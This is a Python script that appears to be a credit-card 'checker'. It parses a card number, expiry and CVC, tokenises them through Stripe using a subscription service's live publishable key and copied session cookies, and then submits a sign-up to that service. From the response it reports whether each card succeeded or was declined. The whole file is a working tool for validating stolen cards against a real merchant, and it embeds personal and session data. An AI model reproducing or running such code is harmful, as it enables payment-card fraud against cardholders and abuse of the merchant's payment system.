import requests
import json
import random
import string
import requests
import re

email = 'jackesputoq00q@gmail.com'

def pregs(list):
    arrays = re.findall(r'[0-9]+', list)
    return arrays

list = '4915666457844557|01|2022|875'

arrs = pregs(list)
cc = arrs[0]
month = arrs[1]
year = arrs[2]
cvc = arrs[3]
print(cc + "|" + month + "|" + year + "|" +cvc)

url = 'https://api.stripe.com/v1/tokens'

headers = {
'authority': 'api.stripe.com',
'method': 'POST',
'path': '/v1/tokens',
'scheme': 'https',
'accept': 'application/json',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '406',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://js.stripe.com',
'referer': 'https://js.stripe.com/v3/controller-bf7d75e1a967cbc993ddd447efa90083.html',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/81.0.4044.122 Chrome/81.0.4044.122 Safari/537.36',
}

postdata = {
'card[number]': cc,
'card[cvc]': cvc,
'card[exp_month]': month,
'card[exp_year]': year,
'guid': '96f8ca4f-93fc-40a1-a3a4-29c8e964612f0bd5b9',
'muid': '181dbb1b-e371-45eb-8acb-8512ae129659dffa45',
'sid': '01a54eff-6e1d-4ed3-8eb1-a7df43a735aec33d30',
'payment_user_agent': 'stripe.js/c37367ec6; stripe-js-v3/c37367ec6',
'time_on_page': '97477',
'referrer': 'https://kicksta.co/',
'key': 'pk_live_I0HVPY6Yc8zOWi1kbazgVcE4',
'pasted_fields': 'number',
}

post = requests.post(url = url, headers = headers, data = postdata)
post = json.loads(post.text)
id = post["id"]
print(id)

url = 'https://dashboard.kicksta.co/onboarding'

headers = {
'authority': 'dashboard.kicksta.co',
'method': 'POST',
'path': '/onboarding',
'scheme': 'https',
'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '168',
'content-type': 'application/json;charset=UTF-8',
'cookie': '_gcl_au=1.1.1682450349.1625273807; _pin_unauth=dWlkPU1UUXhZekF6TVdNdE56STRZUzAwWkdZNUxUa3hOemN0Wm1NMk1tSTJNRFkzTkRCbQ; _ga=GA1.2.172752369.1625273812; ajs_anonymous_id=cb1f0ae4-1dea-4779-a2a5-d64d56c30161; _fbp=fb.1.1625273811997.1146669515; _hjid=65fed77b-de9d-403c-b4d4-4cd316498a8d; __stripe_mid=7709ebd0-265c-43fe-a27c-13b925b4b9db6d2476; __stripe_mid=181dbb1b-e371-45eb-8acb-8512ae129659dffa45; tap_vid=468b8040-dda2-11eb-8947-e5e38d296870; kicksta_referer=https%3A%2F%2Fkicksta.co%2F; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2MjUyNzM4MDgsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vZGFzaGJvYXJkLmtpY2tzdGEuY28vbG9naW4ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE2MjU1MTMzOTMsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vZGFzaGJvYXJkLmtpY2tzdGEuY28vb25ib2FyZGluZy9hZGQtaW5zdGFncmFtLWFjY291bnQifX0=; mp_1cce8f9b03e42e94c27fb5e54f9721b7_mixpanel=%7B%22distinct_id%22%3A%20%2217a69de466912-0c4a86dd0af712-695b5a2f-253e60-17a69de466abd%22%2C%22%24device_id%22%3A%20%2217a69de466912-0c4a86dd0af712-695b5a2f-253e60-17a69de466abd%22%2C%22mp_lib%22%3A%20%22Segment%3A%20web%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; _gid=GA1.2.1473684481.1625628565; _uetsid=87e86df0ded311eb821a1979d2d61ee9; _uetvid=8be7c5e0db9911eb88c1ff55c6765e91; __stripe_sid=01a54eff-6e1d-4ed3-8eb1-a7df43a735aec33d30; XSRF-TOKEN=eyJpdiI6InljcHk1dUdNVStGeVRGSktvRFozZWc9PSIsInZhbHVlIjoiZGtKamNTYzNJdlZ5TUtkK3B6aStaTzNTOWg1M1N4UU9KcmtxMjhlUjNhV3dMdGRPcTdvTVlweWViNzVLQW10WSIsIm1hYyI6ImRlOGQ2ZjE4YzAwYTFkOWMwODViMzhiOTVjZGJlMjMzMWE4MDU5NmQ4Yzc2MzU3MGNiYjJiOTdkOGQyZjdjMmQifQ%3D%3D; kicksta_session=eyJpdiI6IlQ2RnFQNnIzOVwvWUh3MnFjbTlxYjFRPT0iLCJ2YWx1ZSI6ImhLMnJzNUxPZmR0YmplN0xENEhicGFWNGVLcXo3eVJXbmJ2UVdmSTB6VTZ0MFdlK0piclNXTWQwNlF3OUZuMTlQVmRzZ0pjYnB3RjJQdVFUQStXUjN0VlRTMzJPNDMzbUQrRmtET0QwTUxPSFNwVkF5NWMwZ25QN2NONlA3cXpWIiwibWFjIjoiNzNmOWMzMzI0MzBhNTQ0MzA1ZjNkYjNjYWY3MTU5ZmU4NWYwNzRjMjMyNTk2YmIzZGJiYjhmZDg1Y2ZjODUxMiJ9',
'origin': 'https://kicksta.co',
'referer': 'https://kicksta.co/',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/81.0.4044.122 Chrome/81.0.4044.122 Safari/537.36',
}

postdata = '{"email":"'+email+'","coupon_code":"","stripe_token":"'+id+'","plan_id":"kicksta-basic-monthly","terms_acknowledgement":true}'

now = requests.post(url = url, headers = headers, data = postdata)
load = json.loads(now.text)
print(now.text)

time = now.elapsed.total_seconds()
time = str(time)
time = time[0:4]+'s'

if 'Registration' in now.text:
    print('CC: '+list+' Message: '+load["stripe"]+' Time: '+time)

elif 'redirect' in now.text:
    print('CC: '+list+' Message: Succes'+' Time: '+time)

else:
    if 'decline_code' in now.text:
        declinecode = load["stripe"]["decline_code"]
    else:
        declinecode = load["stripe"]["code"]
        print('CC: '+list+ ' Message: '+declinecode+' Time: '+time)




